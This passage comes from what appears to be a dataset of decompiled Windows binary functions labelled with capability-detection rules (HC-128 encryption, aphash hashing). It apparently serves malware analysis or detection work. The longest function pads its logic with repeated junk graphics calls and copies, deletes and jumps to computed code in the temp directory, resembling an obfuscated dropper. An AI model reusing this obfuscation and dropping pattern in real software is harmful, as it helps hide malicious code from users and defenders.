0x48d317;\n        uVar7 = sub.gdi32.dll_GetDCBrushColor();\n        uStack508 = uVar7 >> 0x20;\n        if ((uVar7 & 0x28) == 0) {\n            puVar3 = puVar3 ^ uVar7;\n        }\n        uStack512 = 0x48d326;\n        sub.gdi32.dll_GetROP2();\n        uStack512 = 0x52;\n        uStack516 = 0x48d32d;\n        sub.gdi32.dll_GetROP2();\n        uStack516 = 0x52;\n        uStack520 = 0x48d334;\n        sub.gdi32.dll_GetROP2();\n        uStack520 = 0x48d348;\n        fcn.00404e38();\n        uStack520 = 0x89068014;\n        uStack524 = 0x48d352;\n        sub.gdi32.dll_GetPolyFillMode();\n        uStack524 = 0x7af75b21;\n        uStack528 = 0x48d369;\n        uVar7 = sub.gdi32.dll_GetDCBrushColor();\n        uStack528 = uVar7 >> 0x20;\n        if ((uVar7 & 0x28) == 0) {\n            puVar3 = puVar3 ^ uVar7;\n        }\n        uStack532 = 0x48d378;\n        sub.gdi32.dll_GetROP2();\n        uStack532 = 0x52;\n        uStack536 = 0x48d37f;\n        sub.gdi32.dll_GetROP2();\n        uStack536 = 0x52;\n        uStack540 = 0x48d386;\n        sub.gdi32.dll_GetROP2();\n        uStack540 = 0x48d39a;\n        fcn.00404e38();\n        uStack540 = 0x89068014;\n        uStack544 = 0x48d3a4;\n        sub.gdi32.dll_GetPolyFillMode();\n        uStack544 = 0x7af75b21;\n        uStack548 = 0x48d3bb;\n        uVar7 = sub.gdi32.dll_GetDCBrushColor();\n        uStack548 = uVar7 >> 0x20;\n        if ((uVar7 & 0x28) == 0) {\n            puVar3 = puVar3 ^ uVar7;\n        }\n        uStack552 = 0x48d3ca;\n        sub.gdi32.dll_GetROP2();\n        uStack552 = 0x52;\n        uStack556 = 0x48d3d1;\n        sub.gdi32.dll_GetROP2();\n        uStack556 = 0x52;\n        uStack560 = 0x48d3d8;\n        sub.gdi32.dll_GetROP2();\n        uStack560 = 0x48d3ec;\n        fcn.00404e38();\n        uStack560 = 0x89068014;\n        uStack564 = 0x48d3f6;\n        sub.gdi32.dll_GetPolyFillMode();\n        uStack564 = 0x7af75b21;\n        uStack568 = 0x48d40d;\n        uVar7 = sub.gdi32.dll_GetDCBrushColor();\n        uStack568 = uVar7 >> 0x20;\n        if ((uVar7 & 0x28) == 0) {\n            puVar3 = puVar3 ^ uVar7;\n        }\n        uStack572 = 0x48d41c;\n        sub.gdi32.dll_GetROP2();\n        uStack572 = 0x52;\n        uStack576 = 0x48d423;\n        sub.gdi32.dll_GetROP2();\n        uStack576 = 0x52;\n        uStack580 = 0x48d42a;\n        sub.gdi32.dll_GetROP2();\n        uStack580 = 0x48d43e;\n        fcn.00404e38();\n        uStack580 = 0x89068014;\n        uStack584 = 0x48d448;\n        sub.gdi32.dll_GetPolyFillMode();\n        uStack584 = 0x7af75b21;\n        uStack588 = 0x48d45f;\n        uVar7 = sub.gdi32.dll_GetDCBrushColor();\n        uStack588 = uVar7 >> 0x20;\n        if ((uVar7 & 0x28) == 0) {\n            puVar3 = puVar3 ^ uVar7;\n        }\n        uStack592 = 0x48d46e;\n        sub.gdi32.dll_GetROP2();\n        uStack592 = 0x52;\n        uStack596 = 0x48d475;\n        sub.gdi32.dll_GetROP2();\n        uStack596 = 0x52;\n        uStack600 = 0x48d47c;\n        sub.gdi32.dll_GetROP2();\n        uStack600 = 0x48d490;\n        fcn.00404e38();\n        uStack600 = 0x89068014;\n        uStack604 = 0x48d49a;\n        sub.gdi32.dll_GetPolyFillMode();\n        uStack604 = 0x7af75b21;\n        uStack608 = 0x48d4b1;\n        uVar7 = sub.gdi32.dll_GetDCBrushColor();\n        uStack608 = uVar7 >> 0x20;\n        if ((uVar7 & 0x28) == 0) {\n            puVar3 = puVar3 ^ uVar7;\n        }\n        uStack612 = 0x48d4c0;\n        sub.gdi32.dll_GetROP2();\n        uStack612 = 0x52;\n        uStack616 = 0x48d4c7;\n        sub.gdi32.dll_GetROP2();\n        uStack616 = 0x52;\n        uStack620 = 0x48d4ce;\n        sub.gdi32.dll_GetROP2();\n        uStack620 = 0x48d4e2;\n        fcn.00404e38();\n        uStack620 = 0x89068014;\n        uStack624 = 0x48d4ec;\n        sub.gdi32.dll_GetPolyFillMode();\n        uStack624 = 0x7af75b21;\n        uStack628 = 0x48d503;\n        uVar7 = sub.gdi32.dll_GetDCBrushColor();\n        uStack628 = uVar7 >> 0x20;\n        if ((uVar7 & 0x28) == 0) {\n            puVar3 = puVar3 ^ uVar7;\n        }\n        uStack632 = 0x48d512;\n        sub.gdi32.dll_GetROP2();\n        uStack632 = 0x52;\n        uStack636 = 0x48d519;\n        sub.gdi32.dll_GetROP2();\n        uStack636 = 0x52;\n        uStack640 = 0x48d520;\n        sub.gdi32.dll_GetROP2();\n        uStack640 = 0x48d534;\n        fcn.00404e38();\n        uStack640 = 0x89068014;\n        uStack644 = 0x48d53e;\n        sub.gdi32.dll_GetPolyFillMode();\n        uStack644 = 0x7af75b21;\n        uStack648 = 0x48d555;\n        uVar7 = sub.gdi32.dll_GetDCBrushColor();\n        uStack648 = uVar7 >> 0x20;\n        if ((uVar7 & 0x28) == 0) {\n            puVar3 = puVar3 ^ uVar7;\n        }\n        uStack652 = 0x48d564;\n        sub.gdi32.dll_GetROP2();\n        uStack652 = 0x52;\n        uStack656 = 0x48d56b;\n        sub.gdi32.dll_GetROP2();\n        uStack656 = 0x52;\n        uStack660 = 0x48d572;\n        sub.gdi32.dll_GetROP2();\n        uStack660 = 0x48d57d;\n        fcn.00408ec4();\n        uStack660 = 0x48d590;\n        fcn.0048c5c0();\n        uStack660 = 0x89068014;\n        uStack664 = 0x48d59a;\n        sub.gdi32.dll_GetPolyFillMode();\n        uStack664 = 0x7af75b21;\n        uStack668 = 0x48d5b1;\n        uVar7 = sub.gdi32.dll_GetDCBrushColor();\n        uStack668 = uVar7 >> 0x20;\n        if ((uVar7 & 0x28) == 0) {\n            puVar3 = puVar3 ^ uVar7;\n        }\n        uStack672 = 0x48d5c0;\n        sub.gdi32.dll_GetROP2();\n        uStack672 = 0x52;\n        uStack676 = 0x48d5c7;\n        sub.gdi32.dll_GetROP2();\n        uStack676 = 0x52;\n        uStack680 = 0x48d5ce;\n        sub.gdi32.dll_GetROP2();\n        uStack680 = 0x48d5e5;\n        fcn.0048c4a0();\n        uStack680 = 0x48d5f6;\n        fcn.0048c0e8();\n        uStack680 = 0x89068014;\n        uStack684 = 0x48d600;\n        sub.gdi32.dll_GetPolyFillMode();\n        uStack684 = 0x7af75b21;\n        uStack688 = 0x48d617;\n        uVar7 = sub.gdi32.dll_GetDCBrushColor();\n        uStack688 = uVar7 >> 0x20;\n        if ((uVar7 & 0x28) == 0) {\n            puVar3 = puVar3 ^ uVar7;\n        }\n        uStack692 = 0x48d626;\n        sub.gdi32.dll_GetROP2();\n        uStack692 = 0x52;\n        uStack696 = 0x48d62d;\n        sub.gdi32.dll_GetROP2();\n        uStack696 = 0x52;\n        stack0xfffffd44 = 0x48d634;\n        sub.gdi32.dll_GetROP2();\n        unique0x00001d00 = &fcn.0048c9e8::var_4h;\n        fcn.0048c168();\n        fcn.0048c42c();\n        fcn.0048c2f8(stack0xfffffd44);\n        sub.gdi32.dll_GetPolyFillMode();\n        uVar4 = sub.gdi32.dll_GetDCBrushColor();\n        uVar6 = (uVar4 & 0x28) == 0;\n        if (uVar6) {\n            puVar3 = puVar3 ^ uVar4;\n            uVar6 = puVar3 == NULL;\n        }\n        sub.gdi32.dll_GetROP2();\n        sub.gdi32.dll_GetROP2();\n        sub.gdi32.dll_GetROP2();\n        fcn.004051b0();\n        if (uVar6) {\n            sub.gdi32.dll_GetPolyFillMode();\n            sub.gdi32.dll_GetDCBrushColor();\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            fcn.00408ec4();\n            fcn.0048c5c0();\n            sub.gdi32.dll_GetPolyFillMode();\n            sub.gdi32.dll_GetDCBrushColor();\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            fcn.00402ee0();\n            sub.gdi32.dll_GetPolyFillMode();\n            sub.gdi32.dll_GetDCBrushColor();\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            puVar3 = &fcn.0048c9e8::var_2bah;\n            (*puVar3)();\n        }\n        sub.gdi32.dll_GetPolyFillMode();\n        uVar4 = sub.gdi32.dll_GetDCBrushColor();\n        uVar6 = (uVar4 & 0x28) == 0;\n        if (uVar6) {\n            puVar3 = puVar3 ^ uVar4;\n            uVar6 = puVar3 == NULL;\n        }\n        sub.gdi32.dll_GetROP2();\n        sub.gdi32.dll_GetROP2();\n        sub.gdi32.dll_GetROP2();\n        fcn.004051b0();\n        if (uVar6) {\n            sub.gdi32.dll_GetPolyFillMode();\n            uVar4 = sub.gdi32.dll_GetDCBrushColor();\n            if ((uVar4 & 0x28) == 0) {\n                puVar3 = puVar3 ^ uVar4;\n            }\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            (*var_4h)();\n        }\n        sub.gdi32.dll_GetPolyFillMode();\n        uVar4 = sub.gdi32.dll_GetDCBrushColor();\n        uVar6 = (uVar4 & 0x28) == 0;\n        if (uVar6) {\n            puVar3 = puVar3 ^ uVar4;\n            uVar6 = puVar3 == NULL;\n        }\n        sub.gdi32.dll_GetROP2();\n        sub.gdi32.dll_GetROP2();\n        sub.gdi32.dll_GetROP2();\n        fcn.004051b0();\n        if ((uVar6) && (fcn.004051b0(),  uVar6)) {\n            sub.gdi32.dll_GetPolyFillMode();\n            sub.gdi32.dll_GetDCBrushColor();\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            fcn.00408ec4();\n            fcn.0048c5c0();\n            sub.gdi32.dll_GetPolyFillMode();\n            sub.gdi32.dll_GetDCBrushColor();\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            fcn.00402ee0();\n            sub.gdi32.dll_GetPolyFillMode();\n            sub.gdi32.dll_GetDCBrushColor();\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            puVar3 = &fcn.0048c9e8::var_f84h;\n            fcn.004052bc();\n            fcn.004030dc();\n            fcn.004056d0();\n            fcn.004056e0();\n            (*puVar3)();\n        }\n        sub.gdi32.dll_GetPolyFillMode();\n        uVar4 = sub.gdi32.dll_GetDCBrushColor();\n        uVar6 = (uVar4 & 0x28) == 0;\n        if (uVar6) {\n            puVar3 = puVar3 ^ uVar4;\n            uVar6 = puVar3 == NULL;\n        }\n        sub.gdi32.dll_GetROP2();\n        sub.gdi32.dll_GetROP2();\n        sub.gdi32.dll_GetROP2();\n        fcn.004051b0();\n        if ((uVar6) && (fcn.004051b0(),  !uVar6)) {\n            sub.gdi32.dll_GetPolyFillMode();\n            sub.gdi32.dll_GetDCBrushColor();\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            fcn.00408ec4();\n            fcn.0048c5c0();\n            sub.gdi32.dll_GetPolyFillMode();\n            sub.gdi32.dll_GetDCBrushColor();\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            fcn.00402ee0();\n            sub.gdi32.dll_GetPolyFillMode();\n            sub.gdi32.dll_GetDCBrushColor();\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            puVar3 = &fcn.0048c9e8::var_f84h;\n            cVar1 = fcn.0048c924();\n            if (cVar1 == '\\0') {\n                fcn.004052bc();\n                (*puVar3)();\n            }\n            else {\n                fcn.004052bc();\n                (*puVar3)();\n            }\n        }\n        sub.gdi32.dll_GetPolyFillMode();\n        uVar4 = sub.gdi32.dll_GetDCBrushColor();\n        uVar6 = (uVar4 & 0x28) == 0;\n        if (uVar6) {\n            puVar3 = puVar3 ^ uVar4;\n            uVar6 = puVar3 == NULL;\n        }\n        sub.gdi32.dll_GetROP2();\n        sub.gdi32.dll_GetROP2();\n        sub.gdi32.dll_GetROP2();\n        fcn.004051b0();\n        if (uVar6) {\n            sub.gdi32.dll_GetPolyFillMode();\n            uVar8 = sub.gdi32.dll_GetDCBrushColor();\n            uVar9 = uVar8 >> 0x20;\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            puVar3 = fcn.00402ce4();\n            sub.kernel32.dll_GetTempPathA();\n            fcn.00404f98();\n            fcn.004050b0();\n            sub.gdi32.dll_GetPolyFillMode();\n            uVar4 = sub.gdi32.dll_GetDCBrushColor();\n            if ((uVar4 & 0x28) == 0) {\n                puVar3 = puVar3 ^ uVar4;\n            }\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            fcn.00405264();\n            fcn.004030dc();\n            fcn.00405264();\n            sub.kernel32.dll_CopyFileA();\n            sub.gdi32.dll_GetPolyFillMode();\n            uVar4 = sub.gdi32.dll_GetDCBrushColor();\n            if ((uVar4 & 0x28) == 0) {\n                puVar3 = puVar3 ^ uVar4;\n            }\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            fcn.0048c8c4();\n            fcn.00405124();\n            fcn.00405264();\n            fcn.00404f98();\n            sub.gdi32.dll_GetPolyFillMode();\n            uVar4 = sub.gdi32.dll_GetDCBrushColor();\n            if ((uVar4 & 0x28) == 0) {\n                puVar3 = puVar3 ^ uVar4;\n            }\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            fcn.0048c8c4();\n            fcn.00405124();\n            fcn.00405264();\n            fcn.00404f98();\n            sub.gdi32.dll_GetPolyFillMode();\n            uVar4 = sub.gdi32.dll_GetDCBrushColor();\n            if ((uVar4 & 0x28) == 0) {\n                puVar3 = puVar3 ^ uVar4;\n            }\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            fcn.00405264();\n            sub.kernel32.dll_DeleteFileA();\n            sub.gdi32.dll_GetPolyFillMode();\n            uVar4 = sub.gdi32.dll_GetDCBrushColor();\n            if ((uVar4 & 0x28) == 0) {\n                puVar3 = puVar3 ^ uVar4;\n            }\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            fcn.00405264();\n            sub.kernel32.dll_DeleteFileA();\n            sub.gdi32.dll_GetPolyFillMode();\n            uVar4 = sub.gdi32.dll_GetDCBrushColor();\n            if ((uVar4 & 0x28) == 0) {\n                puVar3 = puVar3 ^ uVar4;\n            }\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            sub.gdi32.dll_GetROP2();\n            cVar1 = fcn.00409318();\n            if (cVar1 == '\\0') {\n                sub.gdi32.dll_GetPolyFillMode();\n                uVar4 = sub.gdi32.dll_GetDCBrushColor();\n                if ((uVar4 & 0x28) == 0) {\n                    puVar3 = puVar3 ^ uVar4;\n                }\n                sub.gdi32.dll_GetROP2();\n                sub.gdi32.dll_GetROP2();\n                sub.gdi32.dll_GetROP2();\n                fcn.0048c8c4();\n                fcn.00405124();\n                fcn.00405264();\n                fcn.004030dc();\n                fcn.00405264();\n                sub.kernel32.dll_CopyFileA();\n                sub.gdi32.dll_GetPolyFillMode();\n                uVar4 = sub.gdi32.dll_GetDCBrushColor();\n                uVar6 = (uVar4 & 0x28) == 0;\n                if (uVar6) {\n                    puVar3 = puVar3 ^ uVar4;\n                    uVar6 = puVar3 == NULL;\n                }\n                sub.gdi32.dll_GetROP2();\n                sub.gdi32.dll_GetROP2();\n                sub.gdi32.dll_GetROP2();\n                uVar9 = 0x7af75b21;\n                uStackY1064 = 0x48e124;\n                fcn.00405264();\n                uStackY1064 = 0x48e131;\n                fcn.00404f98();\n                uStackY1064 = 0x48e146;\n                fcn.0048be70(uVar9);\n            }\n            else {\n                sub.gdi32.dll_GetPolyFillMode();\n                uVar4 = sub.gdi32.dll_GetDCBrushColor();\n                if ((uVar4 & 0x28) == 0) {\n                    puVar3 = puVar3 ^ uVar4;\n                }\n                sub.gdi32.dll_GetROP2();\n                sub.gdi32.dll_GetROP2();\n                sub.gdi32.dll_GetROP2();\n                fcn.0048c8c4();\n                fcn.00405124();\n                fcn.00405264();\n                fcn.004030dc();\n                fcn.00405264();\n                sub.kernel32.dll_CopyFileA();\n                sub.gdi32.dll_GetPolyFillMode();\n                uVar4 = sub.gdi32.dll_GetDCBrushColor();\n                uVar6 = (uVar4 & 0x28) == 0;\n                if (uVar6) {\n                    puVar3 = puVar3 ^ uVar4;\n                    uVar6 = puVar3 == NULL;\n                }\n                sub.gdi32.dll_GetROP2();\n                sub.gdi32.dll_GetROP2();\n                sub.gdi32.dll_GetROP2();\n                uStackY1064 = 0x48e005;\n                fcn.00405264();\n                uStackY1064 = 0x48e012;\n                fcn.00404f98();\n                uStackY1064 = 0x48e027;\n                fcn.0048be70(uVar9);\n            }\n            uStackY1064 = 0x48e156;\n            fcn.004051b0();\n            if (uVar6) {\n                uStackY1064 = 0x89068014;\n                uStackY1068 = 0x48e16c;\n                sub.gdi32.dll_GetPolyFillMode();\n                uStackY1068 = 0x7af75b21;\n                uStackY1072 = 0x48e183;\n                uVar8 = sub.gdi32.dll_GetDCBrushColor();\n                uStackY1072 = uVar8 >> 0x20;\n                uStackY1076 = 0x48e192;\n                sub.gdi32.dll_GetROP2();\n                uStackY1076 = 0x52;\n                uStackY1080 = 0x48e199;\n                sub.gdi32.dll_GetROP2();\n                uStackY1080 = 0x52;\n                uStackY1084 = 0x48e1a0;\n                sub.gdi32.dll_GetROP2();\n                uStackY1084 = 0x48e1ab;\n                fcn.00408ec4();\n                uStackY1084 = 0x48e1be;\n                fcn.0048c5c0();\n                uStackY1084 = 0x89068014;\n                uStackY1088 = 0x48e1c8;\n                sub.gdi32.dll_GetPolyFillMode();\n                uStackY1088 = 0x7af75b21;\n                uStackY1092 = 0x48e1df;\n                uVar8 = sub.gdi32.dll_GetDCBrushColor();\n                uStackY1092 = uVar8 >> 0x20;\n                uStackY1096 = 0x48e1ee;\n                sub.gdi32.dll_GetROP2();\n                uStackY1096 = 0x52;\n                uStackY1100 = 0x48e1f5;\n                sub.gdi32.dll_GetROP2();\n                uStackY1100 = 0x52;\n                uStackY1104 = 0x48e1fc;\n                sub.gdi32.dll_GetROP2();\n                uStackY1104 = 0x48e207;\n                fcn.00408ec4();\n                uStackY1104 = 0x48e21a;\n                fcn.0048c5c0();\n                uStackY1104 = 0x89068014;\n                uStackY1108 = 0x48e224;\n                sub.gdi32.dll_GetPolyFillMode();\n                uStackY1108 = 0x7af75b21;\n                uStackY1112 = 0x48e23b;\n                uVar8 = sub.gdi32.dll_GetDCBrushColor();\n                uStackY1112 = uVar8 >> 0x20;\n                uStackY1116 = 0x48e24a;\n                sub.gdi32.dll_GetROP2();\n                uStackY1116 = 0x52;\n                uStackY1120 = 0x48e251;\n                sub.gdi32.dll_GetROP2();\n                uStackY1120 = 0x52;\n                uStackY1124 = 0x48e258;\n                sub.gdi32.dll_GetROP2();\n                uStackY1124 = 0x48e279;\n                fcn.00402ee0();\n                uStackY1124 = 0x89068014;\n                uStackY1128 = 0x48e283;\n                sub.gdi32.dll_GetPolyFillMode();\n                uStackY1128 = 0x7af75b21;\n                uStackY1132 = 0x48e29a;\n                uVar8 = sub.gdi32.dll_GetDCBrushColor();\n                uStackY1132 = uVar8 >> 0x20;\n                uStackY1136 = 0x48e2a9;\n                sub.gdi32.dll_GetROP2();\n                uStackY1136 = 0x52;\n                uStackY1140 = 0x48e2b0;\n                sub.gdi32.dll_GetROP2();\n                uStackY1140 = 0x52;\n                uStackY1144 = 0x48e2b7;\n                sub.gdi32.dll_GetROP2();\n                puVar3 = &fcn.0048c9e8::var_f84h;\n                uStackY1144 = 0x48e2c2;\n                cVar1 = fcn.0048c924();\n                if (cVar1 == '\\0') {\n                    uStackY1144 = 0x48e2f3;\n                    uStackY1144 = fcn.004052bc();\n                    uStackY1148 = 0x48e4b8;\n                    uStackY1152 = 0x48e59c;\n                    uStackY1156 = 0x48e300;\n                    (*puVar3)();\n                }\n                else {\n                    uStackY1144 = 0x48e2d6;\n                    uStackY1144 = fcn.004052bc();\n                    uStackY1148 = 0x48e4b8;\n                    uStackY1152 = 0x48e4bc;\n                    uStackY1156 = 0x48e2e3;\n                    (*puVar3)();\n                }\n            }\n        }\n        uStackY1064 = 0x89068014;\n        uStackY1068 = 0x48e30a;\n        sub.gdi32.dll_GetPolyFillMode();\n        uStackY1068 = 0x7af75b21;\n        uStackY1072 = 0x48e321;\n        uVar7 = sub.gdi32.dll_GetDCBrushColor();\n        uStackY1072 = uVar7 >> 0x20;\n        uVar6 = (uVar7 & 0x28) == 0;\n        if (uVar6) {\n            puVar3 = puVar3 ^ uVar7;\n            uVar6 = puVar3 == NULL;\n        }\n        uStackY1076 = 0x48e330;\n        sub.gdi32.dll_GetROP2();\n        uStackY1076 = 0x52;\n        uStackY1080 = 0x48e337;\n        sub.gdi32.dll_GetROP2();\n        uStackY1080 = 0x52;\n        uStackY1084 = 0x48e33e;\n        sub.gdi32.dll_GetROP2();\n        uStackY1084 = 0x48e34e;\n        fcn.004051b0();\n        if (uVar6) {\n            uStackY1084 = 0x89068014;\n            uStackY1088 = 0x48e363;\n            sub.gdi32.dll_GetPolyFillMode();\n            uStackY1088 = 0x7af75b21;\n            uStackY1092 = 0x48e37a;\n            uVar7 = sub.gdi32.dll_GetDCBrushColor();\n            uStackY1092 = uVar7 >> 0x20;\n            if ((uVar7 & 0x28) == 0) {\n                puVar3 = puVar3 ^ uVar7;\n            }\n            uStackY1096 = 0x48e389;\n            sub.gdi32.dll_GetROP2();\n            uStackY1096 = 0x52;\n            uStackY1100 = 0x48e390;\n            sub.gdi32.dll_GetROP2();\n            uStackY1100 = 0x52;\n            uStackY1104 = 0x48e397;\n            sub.gdi32.dll_GetROP2();\n            uStackY1104 = 0x48e3a4;\n            fcn.004030dc();\n            uStackY1104 = 0x48e3ba;\n            fcn.0048c034();\n        }\n        uStackY1104 = 0x89068014;\n        uStackY1108 = 0x48e3c4;\n        sub.gdi32.dll_GetPolyFillMode();\n        uStackY1108 = 0x7af75b21;\n        uStackY1112 = 0x48e3db;\n        uVar7 = sub.gdi32.dll_GetDCBrushColor();\n        uStackY1112 = uVar7 >> 0x20;\n        uVar6 = (uVar7 & 0x28) == 0 && puVar3 == uVar7;\n        uStackY1116 = 0x48e3ea;\n        sub.gdi32.dll_GetROP2();\n        uStackY1116 = 0x52;\n        uStackY1120 = 0x48e3f1;\n        sub.gdi32.dll_GetROP2();\n        uStackY1120 = 0x52;\n        uStackY1124 = 0x48e3f8;\n        sub.gdi32.dll_GetROP2();\n        uStackY1124 = 0x48e408;\n        fcn.004051b0();\n        if (uVar6) {\n            uStackY1124 = 0x48e41a;\n            fcn.00464bac();\n        }\n        *in_FS_OFFSET = uStackY1120;\n        uStackY1112 = 0x48e483;\n        uStackY1116 = 0x48e437;\n        fcn.00404dc4();\n        uStackY1116 = 0x48e442;\n        fcn.00405580();\n        uStackY1116 = 0x48e452;\n        fcn.00404dc4();\n        uStackY1116 = 0x48e463;\n        fcn.00405e64();\n        uStackY1116 = 0x48e473;\n        fcn.00404dc4();\n        uStackY1116 = 0x48e47b;\n        fcn.00404da0();\n        return;\n    }\n    // WARNING: Subroutine does not return\n    sub.kernel32.dll_ExitProcess_1();\n}\n",
        "token_count": 13800
    },
    "00401594": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid fcn.00401594(void)\n\n{\n    uint32_t *puVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    uint8_t uVar4;\n    int32_t **in_EAX;\n    uint32_t uVar5;\n    \n    piVar2 = in_EAX[1];\n    piVar3 = *in_EAX;\n    *piVar2 = piVar3;\n    piVar3[1] = piVar2;\n    if (piVar2 == piVar3) {\n        uVar5 = piVar2 + -0x124de9 >> 8 & 0xff;\n        uVar4 = piVar2 + -0x124de9 >> 3 & 0x1f;\n        puVar1 = uVar5 * 4 + 0x493724;\n        *puVar1 = *puVar1 & (-2 << uVar4 | 0xfffffffeU >> 0x20 - uVar4);\n        if (*puVar1 == 0) {\n            uVar4 = uVar5 & 0x1f;\n            *0x493720 = *0x493720 & (-2 << uVar4 | 0xfffffffeU >> 0x20 - uVar4);\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 290
    },
    "004015d4": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004015d4(uint param_1, int32_t param_2)\n\n{\n    uint32_t *puVar1;\n    int32_t **ppiVar2;\n    int32_t *in_EAX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    \n    uVar3 = param_2 - 0xb30U >> 8;\n    iVar4 = (uVar3 - 0x3ff & -(uVar3 < 0x3ff)) + 0x3ff;\n    uVar3 = iVar4 * 8;\n    ppiVar2 = *(uVar3 + 0x4937a8);\n    *in_EAX = uVar3 + 0x4937a4;\n    in_EAX[1] = ppiVar2;\n    *ppiVar2 = in_EAX;\n    *(uVar3 + 0x4937a8) = in_EAX;\n    if (ppiVar2 != uVar3 + 0x4937a4) {\n        return;\n    }\n    uVar3 = uVar3 >> 8 & 0xff;\n    puVar1 = uVar3 * 4 + 0x493724;\n    *puVar1 = *puVar1 | 1 << (iVar4 & 0x1f);\n    *0x493720 = *0x493720 | 1 << (uVar3 & 0x1f);\n    return;\n}\n",
        "token_count": 322
    },
    "004017f8": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nuint8_t ** fcn.004017f8(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint8_t *puVar3;\n    uint32_t *puVar4;\n    uint16_t uVar5;\n    uint8_t *puVar6;\n    uint8_t uVar7;\n    uint8_t **ppuVar8;\n    uint8_t **ppuVar9;\n    uint8_t *in_EAX;\n    uint8_t **ppuVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint8_t *puVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    bool bVar19;\n    \n    if (0xa2c < in_EAX) {\n        if (0x40a2c < in_EAX) {\n            if (in_EAX < 0) {\n                return NULL;\n            }\n            ppuVar10 = sub.kernel32.dll_VirtualAlloc(0, in_EAX + 0x10013 & 0xffff0000, 0x101000, 4);\n            if (ppuVar10 != NULL) {\n                ppuVar10[2] = in_EAX;\n                ppuVar10[3] = in_EAX + 0x10013 & 0xffff0000 | 4;\n                fcn.00401718();\n                ppuVar8 = *0x4957ac;\n                *ppuVar10 = 0x4957a8;\n                ppuVar9 = ppuVar10;\n                ppuVar10[1] = *0x4957ac;\n                *0x4957ac = ppuVar9;\n                *ppuVar8 = ppuVar10;\n                *0x4957a4 = 0;\n                ppuVar10 = ppuVar10 + 4;\n            }\n            return ppuVar10;\n        }\n        uVar17 = in_EAX + 0xd3 & 0xffffff00;\n        uVar18 = uVar17 + 0x30;\n        if (*0x493049 != '\\0') {\n            while( true ) {\n                LOCK();\n                bVar19 = *0x493714 == 0;\n                *0x493714 = *0x493714 ^ bVar19 * (*0x493714 ^ 1);\n                if (bVar19) break;\n                sub.kernel32.dll_Sleep();\n                LOCK();\n                bVar19 = *0x493714 == 0;\n                *0x493714 = *0x493714 ^ bVar19 * (*0x493714 ^ 1);\n                if (bVar19) break;\n                sub.kernel32.dll_Sleep();\n            }\n        }\n        uVar15 = uVar17 - 0xb00;\n        uVar14 = uVar15 >> 0xd;\n        uVar11 = -1 << (uVar15 >> 8 & 0x1f) & *(uVar14 * 4 + 0x493724);\n        if (uVar11 == 0) {\n            uVar15 = -2 << (uVar14 & 0x1f) & *0x493720;\n            if (uVar15 == 0) {\n                if (*0x49371c < uVar18) {\n                    ppuVar10 = fcn.004016a0();\n                }\n                else {\n                    ppuVar10 = *0x493718 - uVar18;\n                    *0x493718 = ppuVar10;\n                    *0x49371c = *0x49371c - uVar18;\n                    ppuVar10[-1] = uVar18 | 2;\n                }\n                *0x493714 = 0;\n                return ppuVar10;\n            }\n            uVar14 = 0;\n            if (uVar15 != 0) {\n                for (; (uVar15 >> uVar14 & 1) == 0; uVar14 = uVar14 + 1) {\n                }\n            }\n            uVar15 = *(uVar14 * 4 + 0x493724);\n            uVar12 = 0;\n            if (uVar15 != 0) {\n                for (; (uVar15 >> uVar12 & 1) == 0; uVar12 = uVar12 + 1) {\n                }\n            }\n            uVar12 = uVar12 | uVar14 << 5;\n        }\n        else {\n            uVar12 = 0;\n            if (uVar11 != 0) {\n                for (; (uVar11 >> uVar12 & 1) == 0; uVar12 = uVar12 + 1) {\n                }\n            }\n            uVar12 = uVar15 >> 8 & 0xffffffe0 | 